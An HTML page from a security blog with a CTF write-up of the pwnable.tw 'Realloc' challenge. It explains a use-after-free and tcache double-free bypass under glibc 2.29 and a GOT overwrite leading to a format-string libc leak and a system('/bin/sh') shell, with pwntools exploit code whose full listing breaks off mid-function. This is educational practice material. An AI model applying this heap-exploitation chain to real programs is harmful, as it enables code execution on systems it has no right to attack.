<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Challange Description        Name Realloc   Points 200   Solves 115 times   Libc 2.29 (with tcache enabled)   Category Exploitation   Description I want to realloc my life :)"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - Realloc"><meta property="og:url" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="Challange Description        Name Realloc   Points 200   Solves 115 times   Libc 2.29 (with tcache enabled)   Category Exploitation   Description I want to realloc my life :)"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/checksec.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/main-func.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/allocate-func.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/reallocate-func.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/free-func.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/exploit-first-stage.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/atoll-patch-printf.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/libc-leak-main-addr.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/atoll-patch-system.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/flag.png"><meta property="article:published_time" content="2020-07-04T18:30:00.000Z"><meta property="article:modified_time" content="2021-06-07T07:03:12.605Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="WarGames"><meta property="article:tag" content="Heap Exploitation"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="checksec.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/"},"headline":"Tainted Bits","image":["https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/checksec.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/main-func.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/allocate-func.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/reallocate-func.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/free-func.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/exploit-first-stage.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/atoll-patch-printf.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/libc-leak-main-addr.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/atoll-patch-system.png","https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/flag.png"],"datePublished":"2020-07-04T18:30:00.000Z","dateModified":"2021-06-07T07:03:12.605Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Challange Description        Name Realloc   Points 200   Solves 115 times   Libc 2.29 (with tcache enabled)   Category Exploitation   Description I want to realloc my life :)"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time datetime="2020-07-04T18:30:00.000Z" title="7/5/2020, 12:00:00 AM">2020-07-05</time></span><span class="level-item">Updated&nbsp;<time datetime="2021-06-07T07:03:12.605Z" title="6/7/2021, 12:33:12 PM">2021-06-07</time></span><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span><span class="level-item">14 minutes read (About 2053 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - Realloc</h1><div class="content"><h2 id="Challange-Description"><a href="#Challange-Description" class="headerlink" title="Challange Description"></a>Challange Description</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>Realloc</td></tr><tr><td>Points</td><td>200</td></tr><tr><td>Solves</td><td>115 times</td></tr><tr><td>Libc</td><td>2.29 (with tcache enabled)</td></tr><tr><td>Category</td><td>Exploitation</td></tr><tr><td>Description</td><td>I want to realloc my life :)</td></tr></tbody></table><span id="more"></span><h2 id="Binary-Protection"><a href="#Binary-Protection" class="headerlink" title="Binary Protection"></a>Binary Protection</h2><p><img src="checksec.png" alt="Binary Protection"></p><p>PIE is disabled, this will make our address leaking task easies as we can leak address from know location.</p><h2 id="Vulnerable-Application"><a href="#Vulnerable-Application" class="headerlink" title="Vulnerable Application"></a>Vulnerable Application</h2><p>The challenge binary is not very complex, it main loop which takes use action and triggers the corresponding function :</p><p><img src="main-func.png" alt="Main function"></p><p>The main function can trigger three other functions based on user action. The <strong>allocate functions</strong> allocates a memory chuck on heap and stores in global array pointer(<em>heap var</em>) and the index of the array is taken from the user. Maximum size of the array is 2 and this check is done in all the function accessing the array.</p><p><img src="allocate-func.png" alt="allocate() function"></p><p><strong>reallocate function</strong> reallocates a heap memory chuck. The function prompts the user for the array index and the size of the new chunk.</p><p><img src="reallocate-func.png" alt="reallocate() function"></p><p>You can also free the allocated object, for that user is asked for the index and then the corresponding entry in the array is set to null.</p><p><img src="free-func.png" alt="rfree()"></p><h3 id="Malloc-Spec"><a href="#Malloc-Spec" class="headerlink" title="Malloc Spec"></a>Malloc Spec</h3><p>The clever thing about this challenge is how it repurposes the <strong>realloc</strong> function to do heap memory related operation like allocate(malloc), reallocate(realloc), and free heap memory chunk.</p><p>Following is the description of how realloc can be repurposed to different heap operation:</p><ol><li><strong>realloc(ptr, NULL)</strong>: same a <em>free(ptr)</em>.</li><li><strong>realloc(ptr, size)</strong>: expand/shrink the memory chunk base on requested size. If the size value is the same as the old chunk size then nothing is done and the same memory chunk is returned.</li><li><strong>realloc(NULL, size)</strong> : same as malloc(size)</li></ol><h2 id="Challenge-Constraints"><a href="#Challenge-Constraints" class="headerlink" title="Challenge Constraints"></a>Challenge Constraints</h2><p>Some constraints of the application that make this challenge very tricky.</p><ol><li>We can allocate the memory chunk less than 120 bytes. This limit the attack to tcache bins only.</li><li>You can only store two memory chucks at any point of time in the global array.</li><li>There is a buffer size check when reading user input for content of the memory chunk so, we cannot do any buffer overflow.</li></ol><h2 id="Vulnerable-Code"><a href="#Vulnerable-Code" class="headerlink" title="Vulnerable Code"></a>Vulnerable Code</h2><p>The vulnerability is in reallocate function, as we saw earlier that if we call <em>realloc(ptr, 0)</em> ( with size 0) it is as good as calling *free(ptr). The function doesn’t check for reallocation size so we can convert the realloc(ptr, size) call to a free(ptr) call and, Since the array storing the pointer to the memory chunk is not set to null it leads to <strong>use-after-free</strong> vulnerability.</p><p>The libc version provided in the challenge is 2.29 which has tcache bins enable, the first thing that came to my mind was the <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache poisoning attack</a> but the double-free vulnerability has been <a target="_blank" rel="noopener" href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=affec03b713c82c43a5b025dddc21bde3334f41e">mitigated in libc version 2.27</a> and later and above. The mitigation is done by checking if the memory chuck is present in the tcache list by traversing the link-list in which the free operation is trying to insert. But, it is possible to bypass this mitigation and we will leverage that to gain arbitrary write, I will discuss the bypass in the next section.</p><h2 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h2><p>Usually, when solving these kinds of challenges I first try to do the libc leak but in this challenge, the way to get the libc leak is through arbitrary write primitive. So let’s first try to understand what is the write primitive is available in this challenge.</p><p>We discuss previous that double-free tcache poisoning attack is not possible the libc version which the binary is using. So, after scratching my head for a couple of hours and the idea surfaced in my mind. The clue was in the name of this challenge, the chuck we free will be placed a tcache bin freelist and the freelist selected based on the chunk size, but if you try to free the same chuck again <em>tcache corruption error</em> will be thrown because freelist selected for the check is done is based on the chuck’s size. But if we can the chuck size by realloc call then the check will be done, then the check will be done on the freelist corresponding to that chunk size. So if we free a chuck then resize the same chuck using use-after-free and again free that same chuck we can bypass the double-free security check.</p><p>We can use this attack to put the address of location we want to write in tcache, next malloc call will return that address and we can write any data to that address. Below is the code for what discussed so far.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app = App(io)</span><br><span class="line">app.intro()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --[ This pollutes the first 0x20 tcache bins with TARGET ADDRESS ]--</span></span><br><span class="line"></span><br><span class="line">app.alloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">app.realloc(<span class="number">1</span>)</span><br><span class="line">app.realloc(<span class="number">1</span>, TARGET_ADDR, <span class="number">20</span>)</span><br><span class="line">app.alloc(<span class="number">0</span>, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the 2nd obj value to null</span></span><br><span class="line">app.realloc(<span class="number">1</span>,<span class="string">&#x27;AAA&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">app.free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the first obj value to null</span></span><br><span class="line">app.realloc(<span class="number">0</span>,<span class="string">&#x27;AAAA&#x27;</span>, <span class="number">120</span>)</span><br><span class="line">app.free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --[ This pollutes the second 0x30 tcache bins with TARGET ADDRESS ]--</span></span><br><span class="line"></span><br><span class="line">app.alloc(<span class="number">0</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">app.realloc(<span class="number">0</span>)</span><br><span class="line">app.realloc(<span class="number">0</span>, TARGET_ADDR, <span class="number">30</span>)</span><br><span class="line">app.alloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the 2nd obj value to null</span></span><br><span class="line">app.realloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">app.free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the first obj value to null</span></span><br><span class="line">app.realloc(<span class="number">0</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">70</span>)</span><br><span class="line">app.free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>After this executing the above code the tcache bin should look like this</p><p><img src="exploit-first-stage.png" alt="First stage"></p><h2 id="The-Leak"><a href="#The-Leak" class="headerlink" title="The Leak"></a>The Leak</h2><p>Now since we have arbitrary write how can we use it do a libc address leak? We can overwrite a GOT table entry since the PIE is disabled the GOT table will be located at a fixed address. Ok good, but which table entry should we overwrite? and with what value? a good candidate will be the function whose parameter we can fully control and the function matching the criteria is <strong>atoll</strong>. This function is used to convert the input string to a long number and, it is used every time the application wants to take a number as an input from the user.</p><p>the atoll function can be patched with printf function because we can use this function leak data from the stack using format string attack. We will patch the <em>GOT</em> entry of <em>atoll</em> function with <strong>PLT</strong> entry of <strong>printf</strong> function since we don’t know the address of printf function and PLT has that address stored so it will be a good target to redirect the GOT entry. Below is the code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start patching ATOLL function</span></span><br><span class="line">PRINTF_PLT = p64(<span class="number">0x401070</span>)</span><br><span class="line">app.alloc(<span class="number">0</span>, PRINTF_PLT, <span class="number">40</span>)</span><br></pre></td></tr></table></figure><p>Once the patch is done the GOT table will look as shown below:</p><p><img src="atoll-patch-printf.png" alt="atoll function patch with printf function"></p><p>Now that we can control a printf function’s first parameter(via atoll) we can use this primitive to leak address from the stack, using format string vulnerability. We can pass value such as <strong>%p</strong> to leak stack data as a pointer, you can leak more data by passing more %p but since the input buffer is limited a more viable option will be to get pointer data from an offset to that you will have to use <strong>%10$p</strong> with this you can leak a pointer at an offset of 10. This method can be used to leak the entire stack of a running process. But that’s not necessary in our case, we can just need to leak data at an offset where there is a pointer in libc memory range which after some digging it found it on an offset 21. Below is the stack dump which shows that there is an address which we can leak</p><p><img src="libc-leak-main-addr.png" alt="function stack which has main function return address"></p><p>The address we are leaking is the return address of main function which is into <em>__libc_start_main</em> function. This function code resided in libc code range so if we are able to leak this address we can calculate the libc base address by subtracting the offset which in our case is <strong>0x26b6b</strong>. Below is the code to achive what we just discussed :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="string">&#x27;Leak Business opens now&#x27;</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    f_str = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset) + <span class="string">&#x27;$p&#x27;</span></span><br><span class="line">    io.sendline(f_str)</span><br><span class="line">    val = io.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    addr = val[<span class="number">7</span>:<span class="number">21</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_base</span>():</span></span><br><span class="line">    libc = ELF(LIBC_BIN)</span><br><span class="line">    libc_start_main = leak_stack(<span class="number">21</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Libc main : &#x27;</span> + <span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">    libc_base = libc_start_main - <span class="number">0x26b6b</span></span><br><span class="line">    log.info(<span class="string">&#x27;Libc Base : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure><h2 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h2><p>Now that we the libc base address we can calculate the <em>system function</em> address and again overwrite the atoll function with the system function. The <em>atoll</em> function is again going to be the victim because we have full control of its parameter. Once we have patched atoll function GOT table should look like this</p><p><img src="atoll-patch-system.png" alt="atoll function patch with system function"></p><p>After the patch we can call the atoll function with ‘/bin/sh’ will give us shell. Below is the code to achieve this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-ctf.so&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">app.alloc(<span class="string">&#x27;&#x27;</span>, p64(system_addr), <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Here is the full working exploit :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author : 0xd3xt3r</span></span><br><span class="line"><span class="comment"># Website : taintedbits.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;./realloc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">LIBC_BIN = <span class="string">&#x27;./libc-ctf.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10106</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process([exe.path] + argv, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proc</span>):</span></span><br><span class="line">        self.pp = proc</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intro</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">self, idx, content, size=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            size = <span class="built_in">len</span>(content)</span><br><span class="line">        self.pp.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.send(content)</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(&#x27;done&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">self, idx, content=<span class="string">&#x27;&#x27;</span>, size=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            size = <span class="built_in">len</span>(content)</span><br><span class="line">        self.pp.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">            self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            self.pp.send(content)</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">self, idx</span>):</span></span><br><span class="line">        self.pp.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.pp.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        self.pp.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ATOLL_GOT = p64(<span class="number">0x404048</span>)</span><br><span class="line">PRINTF_PLT = p64(<span class="number">0x401070</span>)</span><br><span class="line"></span><br><span class="line">TARGET_ADDR = ATOLL_GOT</span><br><span class="line">TARGET_VAL = PRINTF_PLT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./patch_realloc&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: LIBC_BIN&#125;, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line">app.intro()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --[ This pollutes the first 0x20 tcache bins with ATOLL GOT addr ]--</span></span><br><span class="line"></span><br><span class="line">app.alloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">app.realloc(<span class="number">1</span>)</span><br><span class="line">app.realloc(<span class="number">1</span>, TARGET_ADDR, <span class="number">20</span>)</span><br><span class="line">app.alloc(<span class="number">0</span>, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the 2nd obj value to null</span></span><br><span class="line">app.realloc(<span class="number">1</span>,<span class="string">&#x27;AAA&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">app.free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the first obj value to null</span></span><br><span class="line">app.realloc(<span class="number">0</span>,<span class="string">&#x27;AAAA&#x27;</span>, <span class="number">120</span>)</span><br><span class="line">app.free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --[ This pollutes the second 0x30 tcache bins with ATOLL GOT addr ]--</span></span><br><span class="line"></span><br><span class="line">app.alloc(<span class="number">0</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">app.realloc(<span class="number">0</span>)</span><br><span class="line">app.realloc(<span class="number">0</span>, TARGET_ADDR, <span class="number">30</span>)</span><br><span class="line">app.alloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the 2nd obj value to null</span></span><br><span class="line">app.realloc(<span class="number">1</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">app.free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the the first obj value to null</span></span><br><span class="line">app.realloc(<span class="number">0</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">70</span>)</span><br><span class="line">app.free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start patching ATOLL function</span></span><br><span class="line"></span><br><span class="line">app.alloc(<span class="number">0</span>, TARGET_VAL, <span class="number">40</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Patched ATOLL with PRINTF&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;.....&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span>(<span class="params">offset</span>):</span></span><br><span class="line">    <span class="string">&#x27;Leak Business opens now&#x27;</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    f_str = <span class="string">&#x27;%&#x27;</span> + <span 